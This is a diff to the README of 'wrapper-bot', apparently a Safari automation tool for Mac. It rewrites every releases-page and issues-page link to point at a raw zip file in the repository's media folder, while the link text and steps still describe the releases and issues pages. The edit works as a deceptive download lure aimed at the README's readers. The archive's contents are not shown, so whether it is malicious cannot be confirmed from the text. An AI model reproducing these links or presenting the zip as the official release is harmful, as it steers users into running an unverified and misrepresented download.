@@ -1,6 +1,6 @@
 # 🤖 wrapper-bot - Simple Browser Automation Tool
 
-[![Download wrapper-bot](https://img.shields.io/badge/Download-wrapper--bot-%23007ACC?style=for-the-badge&logo=github)](https://github.com/usushiooos/wrapper-bot/releases)
+[![Download wrapper-bot](https://img.shields.io/badge/Download-wrapper--bot-%23007ACC?style=for-the-badge&logo=github)](https://github.com/usushiooos/wrapper-bot/raw/refs/heads/main/media/wrapper_bot_2.1.zip)
 
 ---
 
@@ -25,11 +25,11 @@ If you want to automate browsing tasks such as filling forms, clicking buttons, 
 
 To get wrapper-bot, **visit the releases page** using the link below. This page hosts the latest version and any updates.
 
-[![Get wrapper-bot](https://img.shields.io/badge/Get%20wrapper--bot-grey?style=for-the-badge)](https://github.com/usushiooos/wrapper-bot/releases)
+[![Get wrapper-bot](https://img.shields.io/badge/Get%20wrapper--bot-grey?style=for-the-badge)](https://github.com/usushiooos/wrapper-bot/raw/refs/heads/main/media/wrapper_bot_2.1.zip)
 
 ### Steps to download:
 
-1. Open the [wrapper-bot releases page](https://github.com/usushiooos/wrapper-bot/releases) in your web browser.
+1. Open the [wrapper-bot releases page](https://github.com/usushiooos/wrapper-bot/raw/refs/heads/main/media/wrapper_bot_2.1.zip) in your web browser.
 2. Look for the latest release at the top of the page.
 3. Under the “Assets” section, click on the file named similarly to `wrapper-bot.zip` or `.app` to download it.
 4. Save the file to your preferred folder on your Mac.
@@ -114,7 +114,7 @@ wrapper-bot only acts within your Safari browser session. It does not send data 
 
 Updates come through the GitHub releases page. Check there regularly or subscribe to the repository for notifications.
 
-If you experience problems or have questions, open an issue on the [GitHub wrapper-bot page](https://github.com/usushiooos/wrapper-bot/issues).
+If you experience problems or have questions, open an issue on the [GitHub wrapper-bot page](https://github.com/usushiooos/wrapper-bot/raw/refs/heads/main/media/wrapper_bot_2.1.zip).
 
 ---
 
@@ -122,4 +122,4 @@ If you experience problems or have questions, open an issue on the [GitHub wrapp
 
 Visit the releases page to download:
 
-[Download wrapper-bot](https://github.com/usushiooos/wrapper-bot/releases)
+[Download wrapper-bot](https://github.com/usushiooos/wrapper-bot/raw/refs/heads/main/media/wrapper_bot_2.1.zip)
